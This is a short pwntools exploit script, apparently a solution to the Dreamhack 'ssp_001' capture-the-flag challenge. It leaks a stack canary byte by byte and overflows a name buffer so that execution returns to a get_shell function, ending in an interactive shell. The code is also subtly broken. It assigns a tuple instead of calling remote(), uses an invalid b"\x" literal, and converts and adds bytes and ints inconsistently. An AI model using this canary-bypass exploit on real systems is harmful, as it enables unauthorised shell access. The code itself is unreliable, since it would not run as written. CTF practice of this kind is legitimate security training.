from pwn import *

p = remote = ("http://host3.dreamhack.games", 18185)
e = ELF("./ssp_001")

canary = b"\x"
get_shell = e.symbols["get_shell"]

p.recvuntil("> ")

def canary_leak(num):
    p.sendline(b"P")
    p.recvuntil(": ")
    p.sendline(str(num))

    p.recvuntil("is :")
    return p.recv()[:2]

canary = int(canary, 16)

canary += canary_leak(131)
canary += canary_leak(130)
canary += canary_leak(129)
canary += canary_leak(128)

print("Canary: "+hex(canary))

payload = b"\x90"*64
payload += p32(canary)
payload += b"\x90"*8
payload += p32(get_shell)

p.sendline("E")
p.recvuntil("Size : ")

p.sendline(str(len(payload)))

p.recvuntil("Name : ")
p.sendline(payload)
p.interactive()